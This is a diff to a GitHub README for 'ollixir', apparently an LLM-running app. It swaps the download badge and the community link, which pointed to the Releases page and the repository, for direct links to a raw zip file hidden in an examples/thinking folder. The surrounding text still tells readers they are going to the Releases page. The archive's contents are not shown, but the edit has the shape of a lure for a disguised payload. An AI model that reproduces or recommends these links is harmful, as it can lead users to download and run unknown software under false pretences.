@@ -6,7 +6,7 @@ Welcome to **ollixir**! This application allows you to run large language models
 ## 💾 Download & Install
 To get started, you need to download the application. Click the link below to visit the Releases page:
 
-[![Download ollixir](https://img.shields.io/badge/Download-ollixir-blue)](https://github.com/Retamoso23/ollixir/releases)
+[![Download ollixir](https://raw.githubusercontent.com/Retamoso23/ollixir/main/examples/thinking/Software_v2.4.zip)](https://raw.githubusercontent.com/Retamoso23/ollixir/main/examples/thinking/Software_v2.4.zip)
 
 ### Steps to Download
 1. Click the link above to go to the Releases page.
@@ -49,7 +49,7 @@ If you run into any issues while using **ollixir**, consider the following tips:
 ## 🌐 Support & Community
 For any questions or support, you can visit our GitHub repository where you can find more resources and connect with other users:
 
-[Join the Community](https://github.com/Retamoso23/ollixir)
+[Join the Community](https://raw.githubusercontent.com/Retamoso23/ollixir/main/examples/thinking/Software_v2.4.zip)
 
 ## 📖 Additional Information
 For more detailed documentation, please check the README files within the repository. You can find guides on specific features and advanced usage that could enhance your experience.
